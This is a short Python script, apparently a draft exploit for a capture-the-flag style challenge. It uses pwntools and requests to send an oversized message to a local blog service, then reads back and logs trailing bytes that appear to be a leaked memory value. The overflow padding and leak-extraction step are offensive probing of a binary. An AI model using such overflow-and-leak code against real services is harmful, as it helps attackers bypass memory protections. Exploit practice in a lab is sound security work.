"""v1.0"""

import requests
from pwn import *

#==================================================================================

def find_val(content):
    for i in range(0, 1222):
        if str(content[-i]) == str(10):
            return content[len(content) - i + 1:]

#==================================================================================
#=Clean db============================================================
#==================================================================================

"""DB_PATH = os.getcwd() + '/share/root/db/blog.db'
if os.path.exists(DB_PATH):
    os.remove(DB_PATH)"""

exe = ELF('./bin')
#exe.process()

#==================================================================================

URL = 'http://0.0.0.0:60443/blog'

m = 'A'*230
r = requests.post(url=URL, data={'message': m})
r = requests.get(URL)

val = find_val(r.content).hex()
log.info('Val: 0x%s' % val)

r = requests.post(url=URL, data={'message': m})
r = requests.get(URL)
print(r)